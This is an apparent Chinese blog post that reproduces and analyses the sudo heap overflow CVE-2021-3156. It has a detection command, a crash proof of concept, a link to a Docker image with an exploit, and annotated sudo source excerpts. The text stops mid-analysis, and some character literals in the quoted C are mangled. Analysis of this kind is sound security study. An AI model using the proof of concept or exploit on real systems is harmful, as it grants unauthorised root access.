<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>CVE-2021-3156 漏洞复现笔记 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CVE-2021-3156 漏洞复现笔记</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <h1>
<a id="_0"></a>一、概述</h1> 
<p>CVE-2021-3156 漏洞主要成因在于sudo中存在一个基于堆的缓冲区溢出漏洞，当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码</p> 
<h1>
<a id="_3"></a>二、漏洞简介与环境搭建</h1> 
<h2>
<a id="_4"></a>漏洞简介：</h2> 
<p>漏洞编号: CVE-2021-3156<br> 漏洞产品: sudo<br> 影响版本:<br> 1.8.2-1.8.31sp12;<br> 1.9.0-1.9.5sp1<br> 利用后果: 本地提权</p> 
<h2>
<a id="_11"></a>漏洞检测：</h2> 
<p>用户首先使用非root账户登录系统，然后执行</p> 
<pre><code class="prism language-bash">sudoedit -s / 
</code></pre> 
<p>如果返回如图所示以usage开头的报错：<br> <img src="https://images2.imgbox.com/58/90/0xWJC1OT_o.png" alt="在这里插入图片描述"><br> 则说明当前系统不存在此漏洞或漏洞已修复<br> 如果返回如下图所示以sudoedit为开头的报错则说明系统存在此漏洞：<br> <img src="https://images2.imgbox.com/d6/ec/G74B3BFk_o.png" alt="在这里插入图片描述"></p> 
<h2>
<a id="_22"></a>环境搭建：</h2> 
<p>由于本人的虚拟机中的ubuntu系统均已修复此漏洞，所以直接选择用拉取合适的docker<br> docker 环境: https://hub.docker.com/r/chenaotian/cve-2021-3156<br> 这个docker中提供了：<br> 1.自己编译的可源码调式的sudo<br> 2.有调试符号的glibc<br> 3.gdb 和gdb插件pwngdb &amp; pwndbg<br> 4.exp.c 及其编译成功的exp</p> 
<p>这对我们的漏洞分析和漏洞复现过程有很大帮助，可以让我们把更多的时间和精力放到对漏洞代码的分析和利用上，而不是苦逼的配环境。</p> 
<p>首先拉取镜像<br> <img src="https://images2.imgbox.com/70/a5/l7slhFeH_o.png" alt="在这里插入图片描述"></p> 
<p>然后启动docker，查看一下sudo的版本：<br> <img src="https://images2.imgbox.com/08/35/4bZZ8OLd_o.png" alt="在这里插入图片描述"><br> 用上面提到的漏洞检测方式来检查一下是否存在此漏洞：<br> <img src="https://images2.imgbox.com/26/7b/uoXDpdvl_o.png" alt="在这里插入图片描述"><br> 最后检测一下是否可以打通：<br> <img src="https://images2.imgbox.com/78/7e/brwjrlwo_o.png" alt="在这里插入图片描述"><br> 用的是id为1000的test账户执行exp，执行完之后用户权限已经变成了root，成功提权，到这里所有的漏洞复现准备工作都做完了，接下来进行漏洞分析</p> 
<h1>
<a id="_44"></a>三、漏洞分析</h1> 
<p>首先来分析一下此漏洞的POC：</p> 
<pre><code class="prism language-bash">sudoedit -s <span class="token string">''</span> <span class="token variable"><span class="token variable">`</span>python3 -c <span class="token string">"print('A'*80)"</span><span class="token variable">`</span></span>  
</code></pre> 
<p><img src="https://images2.imgbox.com/31/27/QaNXQD46_o.png" alt="在这里插入图片描述"><br> 可以看到是一个内存错误，此漏洞就在于sudo没有正确处理好反斜杠。当使用-s或-i的时候，sudo会转义特殊字符，但是如果用-s或-i参数和sudoedit命令，特殊字符不会被转义，这会导致一个缓冲区溢出。可以看到我们所用的poc就是使用sudoedit命令以及-s 参数，后面则是一个反斜杠加上由python3命令生成的80个A。</p> 
<p>接下来我们深入到sudo源码里去看看为什么这样一行命令就可以造成缓冲区溢出，从而导致程序崩溃甚至最后达到提权的目的。</p> 
<p>先来看sudo.c的133行，也就是main函数位置</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">int</span> <span class="token function">parse_args</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>nargc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>nargv<span class="token punctuation">,</span>  
<span class="token number">2.</span>    <span class="token keyword">struct</span> <span class="token class-name">sudo_settings</span> <span class="token operator">*</span><span class="token operator">*</span>settingsp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>env_addp<span class="token punctuation">)</span>  
<span class="token number">3.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">4.</span>    <span class="token keyword">struct</span> <span class="token class-name">environment</span> extra_env<span class="token punctuation">;</span>  
<span class="token number">5.</span>    <span class="token keyword">int</span> mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>       <span class="token comment">/* what mode is sudo to be run in? */</span>  
<span class="token number">6.</span>    <span class="token keyword">int</span> flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">/* mode flags */</span>  
<span class="token number">7.</span>    <span class="token keyword">int</span> valid_flags <span class="token operator">=</span> DEFAULT_VALID_FLAGS<span class="token punctuation">;</span>  
<span class="token number">8.</span>    <span class="token keyword">int</span> ch<span class="token punctuation">,</span> i<span class="token punctuation">;</span>  
<span class="token number">9.</span>    <span class="token keyword">char</span> <span class="token operator">*</span>cp<span class="token punctuation">;</span>  
<span class="token number">10.</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>runas_user <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  
<span class="token number">11.</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>runas_group <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  
<span class="token number">12.</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>progname<span class="token punctuation">;</span>  
<span class="token number">13.</span>    <span class="token keyword">int</span> proglen<span class="token punctuation">;</span>  
<span class="token number">14.</span>    <span class="token function">debug_decl</span><span class="token punctuation">(</span>parse_args<span class="token punctuation">,</span> SUDO_DEBUG_ARGS<span class="token punctuation">)</span>  
<span class="token number">15.</span>    ······  
<span class="token number">16.</span>    ······  
<span class="token number">17.</span>    <span class="token comment">/* First, check to see if we were invoked as "sudoedit". */</span>  
<span class="token number">18.</span>    proglen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>progname<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">19.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>proglen <span class="token operator">&gt;</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>progname <span class="token operator">+</span> proglen <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"edit"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">20.</span>    progname <span class="token operator">=</span> <span class="token string">"sudoedit"</span><span class="token punctuation">;</span>  
<span class="token number">21.</span>    mode <span class="token operator">=</span> MODE_EDIT<span class="token punctuation">;</span>  
<span class="token number">22.</span>    sudo_settings<span class="token punctuation">[</span>ARG_SUDOEDIT<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>  
<span class="token number">23.</span>    <span class="token punctuation">}</span>  
<span class="token number">24.</span>    ······  
<span class="token number">25.</span>    ······  
<span class="token number">26.</span>    <span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span>  
<span class="token number">27.</span>            sudo_settings<span class="token punctuation">[</span>ARG_USER_SHELL<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>  
<span class="token number">28.</span>            <span class="token function">SET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">29.</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>  
<span class="token number">30.</span>    ······  
<span class="token number">31.</span>    ······  
<span class="token number">32.</span><span class="token punctuation">}</span>  
</code></pre> 
<p>首先parse_args会检测执行命令的长度，如果大于4且后四个字母为edit，则说明调用的不是sudo而是sudoedit，于是将mode设置为MODE_EDIT，然后去检测参数，如果参数为-s，则把flags设置为MODE_SHELL</p> 
<p>接下来继续跟进main函数，然后会执行policy_check函数</p> 
<p>跟进一下:</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">policy_check</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">plugin_container</span> <span class="token operator">*</span>plugin<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
<span class="token number">2.</span>    <span class="token keyword">char</span> <span class="token operator">*</span>env_add<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>command_info<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv_out<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
<span class="token number">3.</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>user_env_out<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  
<span class="token number">4.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">5.</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>  
<span class="token number">6.</span>    <span class="token function">debug_decl</span><span class="token punctuation">(</span>policy_check<span class="token punctuation">,</span> SUDO_DEBUG_PCOMM<span class="token punctuation">)</span>  
<span class="token number">7.</span>  
<span class="token number">8.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>plugin<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>policy<span class="token operator">-&gt;</span>check_policy <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">9.</span>    <span class="token function">sudo_fatalx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"policy plugin %s is missing the `check_policy' method"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
<span class="token number">10.</span>        plugin<span class="token operator">-&gt;</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">11.</span>    <span class="token punctuation">}</span>  
<span class="token number">12.</span>    <span class="token function">sudo_debug_set_active_instance</span><span class="token punctuation">(</span>plugin<span class="token operator">-&gt;</span>debug_instance<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">13.</span>    ret <span class="token operator">=</span> plugin<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>policy<span class="token operator">-&gt;</span><span class="token function">check_policy</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> env_add<span class="token punctuation">,</span> command_info<span class="token punctuation">,</span>  
<span class="token number">14.</span>    argv_out<span class="token punctuation">,</span> user_env_out<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">15.</span>    <span class="token function">sudo_debug_set_active_instance</span><span class="token punctuation">(</span>sudo_debug_instance<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">16.</span>    <span class="token function">debug_return_int</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">17.</span><span class="token punctuation">}</span>  
</code></pre> 
<p>会发现程序执行流走向了plugin-&gt;u.policy-&gt;check_policy(argc, argv, env_add, command_info，argv_out, user_env_out);</p> 
<p>继续跟进，由于这里使用的是虚表，直接静态不太好看得出调用的是什么函数，所以使用gdb进行动态调试：<br> <img src="https://images2.imgbox.com/7d/c0/6A8IwAAM_o.png" alt="在这里插入图片描述"></p> 
<p>断点打在policy_check函数这里，然后步进</p> 
<p><img src="https://images2.imgbox.com/88/75/e0ljtHU9_o.png" alt="在这里插入图片描述"></p> 
<p>可以看到，这里的call函数实际上调用的是sudoers_policy_check函数，我们看看这个函数源码长什么样子：</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token function">sudoers_policy_check</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>env_add<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
<span class="token number">2.</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>command_infop<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv_out<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>user_env_out<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  
<span class="token number">3.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">4.</span>    <span class="token keyword">struct</span> <span class="token class-name">sudoers_exec_args</span> exec_args<span class="token punctuation">;</span>  
<span class="token number">5.</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>  
<span class="token number">6.</span>    <span class="token function">debug_decl</span><span class="token punctuation">(</span>sudoers_policy_check<span class="token punctuation">,</span> SUDOERS_DEBUG_PLUGIN<span class="token punctuation">)</span>  
<span class="token number">7.</span>  
<span class="token number">8.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ISSET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_EDIT<span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token number">9.</span>    <span class="token function">SET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_RUN<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">10.</span>  
<span class="token number">11.</span>    exec_args<span class="token punctuation">.</span>argv <span class="token operator">=</span> argv_out<span class="token punctuation">;</span>  
<span class="token number">12.</span>    exec_args<span class="token punctuation">.</span>envp <span class="token operator">=</span> user_env_out<span class="token punctuation">;</span>  
<span class="token number">13.</span>    exec_args<span class="token punctuation">.</span>info <span class="token operator">=</span> command_infop<span class="token punctuation">;</span>  
<span class="token number">14.</span>  
<span class="token number">15.</span>    ret <span class="token operator">=</span> <span class="token function">sudoers_policy_main</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> env_add<span class="token punctuation">,</span> <span class="token operator">&amp;</span>exec_args<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">16.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">==</span> true <span class="token operator">&amp;&amp;</span> sudo_version <span class="token operator">&gt;=</span> <span class="token function">SUDO_API_MKVERSION</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">17.</span>    <span class="token comment">/* Unset close function if we don't need it to avoid extra process. */</span>  
<span class="token number">18.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>def_log_input <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>def_log_output <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>def_use_pty <span class="token operator">&amp;&amp;</span>  
<span class="token number">19.</span>        <span class="token operator">!</span><span class="token function">sudo_auth_needs_end_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token number">20.</span>        sudoers_policy<span class="token punctuation">.</span>close <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  
<span class="token number">21.</span>    <span class="token punctuation">}</span>  
<span class="token number">22.</span>    <span class="token function">debug_return_int</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">23.</span><span class="token punctuation">}</span>  
</code></pre> 
<p>函数非常简短，基本就是设置一些变量，然后就去调用了sudoers_policy_main函数，继续跟进到sudoers_policy_main函数中：</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">int</span>  <span class="token function">sudoers_policy_main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> pwflag<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>env_add<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
<span class="token number">2.</span>    <span class="token keyword">void</span> <span class="token operator">*</span>closure<span class="token punctuation">)</span>  
<span class="token number">3.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">4.</span>    ··· ···  
<span class="token number">5.</span>    ··· ···  
<span class="token number">6.</span>  
<span class="token number">7.</span>    <span class="token comment">/* 
8.     * Make a local copy of argc/argv, with special handling 
9.     * for pseudo-commands and the '-i' option. 
10.     */</span>  
<span class="token number">11.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">12.</span>    ··· ···  
<span class="token number">13.</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">14.</span>    <span class="token comment">/* Must leave an extra slot before NewArgv for bash's --login */</span>  
<span class="token number">15.</span>    NewArgc <span class="token operator">=</span> argc<span class="token punctuation">;</span>  
<span class="token number">16.</span>    NewArgv <span class="token operator">=</span> <span class="token function">reallocarray</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> NewArgc <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">17.</span>    ··· ···  
<span class="token number">18.</span>    <span class="token punctuation">}</span>  
<span class="token number">19.</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">++</span>NewArgv<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> argc <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">20.</span>    NewArgv<span class="token punctuation">[</span>NewArgc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  
<span class="token number">21.</span>    ··· ···  
<span class="token number">22.</span>    <span class="token punctuation">}</span>  
<span class="token number">23.</span>    <span class="token punctuation">}</span>  
<span class="token number">24.</span>    ··· ···  
<span class="token number">25.</span>    cmnd_status <span class="token operator">=</span> <span class="token function">set_cmnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">26.</span>    ··· ···  
<span class="token number">27.</span>    ··· ···  
<span class="token number">28.</span>    ··· ···  
<span class="token number">29.</span><span class="token punctuation">}</span>  
</code></pre> 
<p>由于这个函数比较长，这里只选取了一些值得关注的操作，其余以省略号替代<br> 先是传了一些参数，然后调用set_cmnd，我在gdb调的时候用的命令是sudoedit -s ‘’ aaaaaaaa</p> 
<p><img src="https://images2.imgbox.com/11/07/SNAv8Lfq_o.png" alt="在这里插入图片描述"><br> 来看看党调用set_cmnd的时候NewArgc和NewArgv的值为多少</p> 
<p><img src="https://images2.imgbox.com/44/be/XP8hOyKH_o.png" alt="在这里插入图片描述"><br> 接下来我们看看set_cmnd做了什么</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">static</span> <span class="token keyword">int</span>  
<span class="token number">2.</span><span class="token function">set_cmnd</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>  
<span class="token number">3.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">4.</span>    ··· ···  
<span class="token number">5.</span>    ··· ···  
<span class="token number">6.</span>  
<span class="token number">7.</span>    <span class="token comment">/* set user_args */</span>  
<span class="token number">8.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>NewArgc <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">9.</span>        <span class="token keyword">char</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">;</span>  
<span class="token number">10.</span>        <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> n<span class="token punctuation">;</span>  
<span class="token number">11.</span>  
<span class="token number">12.</span>        <span class="token comment">/* Alloc and build up user_args. */</span>  
<span class="token number">13.</span>        <span class="token comment">//根据参数总长度计算size， 后续malloc 申请，没有问题  </span>
<span class="token number">14.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span>  
<span class="token number">15.</span>        size <span class="token operator">+=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>av<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  
<span class="token number">16.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">17.</span>        <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">18.</span>        <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">19.</span>        <span class="token punctuation">}</span>  
<span class="token number">20.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_SHELL<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">21.</span>        <span class="token comment">/* 
22.         * When running a command via a shell, the sudo front-end 
23.         * escapes potential meta chars.  We unescape non-spaces 
24.         * for sudoers matching and logging purposes. 
25.         */</span>  
<span class="token number">26.</span>         <span class="token comment">//将所有参数拷贝到一起放到堆中，逻辑是遇到''加非空格类型字符则只拷贝非空格字符  </span>
<span class="token number">27.</span>         <span class="token comment">//但这里x00 并不算空格类型字符  </span>
<span class="token number">28.</span>         <span class="token comment">//他没有考虑参数如果只有一个''或以''结尾并且下两个字符后就是另一个字符串情况  </span>
<span class="token number">29.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>to <span class="token operator">=</span> user_args<span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>from <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">30.</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>from<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">31.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>from<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>from<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token number">32.</span>                from<span class="token operator">++</span><span class="token punctuation">;</span>  
<span class="token number">33.</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>from<span class="token operator">++</span><span class="token punctuation">;</span>  
<span class="token number">34.</span>            <span class="token punctuation">}</span>  
<span class="token number">35.</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token char">' '</span><span class="token punctuation">;</span>  
<span class="token number">36.</span>        <span class="token punctuation">}</span>  
<span class="token number">37.</span>        <span class="token operator">*</span><span class="token operator">--</span>to <span class="token operator">=</span> <span class="token char">''</span><span class="token punctuation">;</span>  
<span class="token number">38.</span>        <span class="token punctuation">}</span>   
<span class="token number">39.</span>        ··· ···  
<span class="token number">40.</span>    <span class="token punctuation">}</span>  
<span class="token number">41.</span>    <span class="token punctuation">}</span>  
<span class="token number">42.</span>    ··· ···  
<span class="token number">43.</span>    ··· ···  
<span class="token number">44.</span><span class="token punctuation">}</span>  
</code></pre> 
<p>同样也是省略了一些不需要分析的代码</p> 
<p>走到这里，我们终于来到了溢出点，我们输入的参数就是在这里被存进堆中，我们将这段代码切割成小的代码片来分析它的意图</p> 
<p>首先是申请内存部分：</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">for</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span>  
<span class="token number">2.</span>        size <span class="token operator">+=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>av<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  
<span class="token number">3.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">4.</span>        <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">5.</span>        <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">6.</span>        <span class="token punctuation">}</span>  
